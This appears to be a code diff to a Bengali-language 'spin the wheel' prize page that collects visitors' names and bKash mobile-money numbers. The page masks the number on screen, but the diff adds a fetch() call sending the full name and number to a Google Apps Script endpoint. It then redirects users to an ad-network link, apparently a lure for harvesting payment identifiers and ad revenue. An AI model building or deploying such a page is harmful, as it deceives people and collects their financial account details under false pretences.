@@ -88,7 +88,7 @@
       text-shadow: 3px 5px 2px rgba(0, 0, 0, 0.15);
     }
     .wheel .number span::after {
-      content: '$';
+      content: '৳';
       position: absolute;
       font-size: 0.75em;
       font-weight: 500;
@@ -149,21 +149,21 @@
 
   <div class="container">
     <div class="wheel" id="wheel">
-      <div class="number" style="--i:1;--clr:#db7093;"><span>100</span></div>
-      <div class="number" style="--i:2;--clr:#20b2aa;"><span>1</span></div>
-      <div class="number" style="--i:3;--clr:#daa520;"><span>50</span></div>
-      <div class="number" style="--i:4;--clr:#ff340f;"><span>0</span></div>
-      <div class="number" style="--i:5;--clr:#4169e1;"><span>1000</span></div>
-      <div class="number" style="--i:6;--clr:#3cb371;"><span>10</span></div>
-      <div class="number" style="--i:7;--clr:#d63e92;"><span>5</span></div>
-      <div class="number" style="--i:8;--clr:#ff7f50;"><span>20</span></div>
+      <div class="number" style="--i:1;--clr:#db7093;"><span>১০০</span></div>
+      <div class="number" style="--i:2;--clr:#20b2aa;"><span>৫</span></div>
+      <div class="number" style="--i:3;--clr:#daa520;"><span>৫০</span></div>
+      <div class="number" style="--i:4;--clr:#ff340f;"><span>০</span></div>
+      <div class="number" style="--i:5;--clr:#4169e1;"><span>২00</span></div>
+      <div class="number" style="--i:6;--clr:#3cb371;"><span>০</span></div>
+      <div class="number" style="--i:7;--clr:#d63e92;"><span>৫০০</span></div>
+      <div class="number" style="--i:8;--clr:#ff7f50;"><span>আবার চেষ্টা করুন</span></div>
     </div>
     <div class="spinBtn" id="spinBtn">Spin</div>
   </div>
 
   <div id="formPopup">
     <div class="popup-content">
-      <p>তালিকায় যোগ দিতে আপনার নাম ও বিকাশ নাম্বার দিন</p>
+      <p>আপনার নাম ও বিকাশ নাম্বার দিন</p>
       <input type="text" id="name" placeholder="আপনার নাম">
       <input type="text" id="bkash" placeholder="বিকাশ নাম্বার">
       <button onclick="submitForm()">সাবমিট</button>
@@ -202,11 +202,17 @@
       const name = document.getElementById('name').value.trim();
       const bkash = document.getElementById('bkash').value.trim();
       if (name && bkash.length >= 11) {
-        const userList = document.getElementById('userList');
-        const row = document.createElement('tr');
-        row.innerHTML = `<td>${name}</td><td>****${bkash.slice(-4)}</td>`;
-        userList.prepend(row);
-        if (userList.rows.length > 8) userList.deleteRow(-1);
+        // Only show masked bkash in UI
+        const maskedBkash = bkash.slice(-6).padStart(bkash.length, '*');
+        addToList(name, maskedBkash);
+
+        // Send full data to Google Sheet
+        fetch('https://script.google.com/macros/s/AKfycbyIC0nUvPk3WWP_lLZSG_jHdJHhOHt9ny8Lfu0-GBONNkYD6MhYnSemGVLIGLwP3bL9/exec', {
+          method: 'POST',
+          body: JSON.stringify({ name, bkash }),
+          headers: { 'Content-Type': 'application/json' }
+        });
+
         document.getElementById('formPopup').style.display = 'none';
         document.getElementById('successPopup').style.display = 'flex';
       } else {
@@ -214,55 +220,18 @@
       }
     }
 
+    function addToList(name, maskedBkash) {
+      const userList = document.getElementById('userList');
+      const row = document.createElement('tr');
+      row.innerHTML = `<td>${name}</td><td>${maskedBkash}</td>`;
+      userList.prepend(row);
+      if (userList.rows.length > 8) userList.deleteRow(-1);
+    }
+
     function goToRedirect() {
       document.getElementById('successPopup').style.display = 'none';
       window.location.href = 'https://www.profitableratecpm.com/g5za6ey4sa?key=1998f472c59bc55a37015a5445ced87c'; // এখানে তোমার অ্যাডস্টের্রা direct লিংক বসাও
     }
   </script>
-
-
-  <script>
-  function submitForm() {
-    const name = document.getElementById('name').value.trim();
-    const bkash = document.getElementById('bkash').value.trim();
-    if (name && bkash.length >= 11) {
-      // Only show masked bkash in UI
-      const maskedBkash = bkash.slice(-6).padStart(bkash.length, '*');
-      addToList(name, maskedBkash);
-
-      // Send full data to Google Sheet
-      fetch('https://script.google.com/macros/s/AKfycbyIC0nUvPk3WWP_lLZSG_jHdJHhOHt9ny8Lfu0-GBONNkYD6MhYnSemGVLIGLwP3bL9/exec', {
-        method: 'POST',
-        body: JSON.stringify({ name, bkash }),
-        headers: { 'Content-Type': 'application/json' }
-      });
-
-      document.getElementById('formPopup').style.display = 'none';
-      document.getElementById('successPopup').style.display = 'flex';
-    } else {
-      alert('সঠিক নাম ও বিকাশ নাম্বার দিন');
-    }
-  }
-
-  function addToList(name, maskedBkash) {
-    const userList = document.getElementById('userList');
-    const row = document.createElement('tr');
-    row.innerHTML = `<td>${name}</td><td>${maskedBkash}</td>`;
-    userList.prepend(row);
-    if (userList.rows.length > 8) userList.deleteRow(-1);
-
-    const serialList = document.getElementById('serialList');
-    const item = document.createElement('li');
-    item.textContent = maskedBkash;
-    serialList.appendChild(item);
-    if (serialList.children.length > 10) serialList.removeChild(serialList.firstChild);
-  }
-</script>
-
-
-  
-
 </body>
 </html>
-
-    
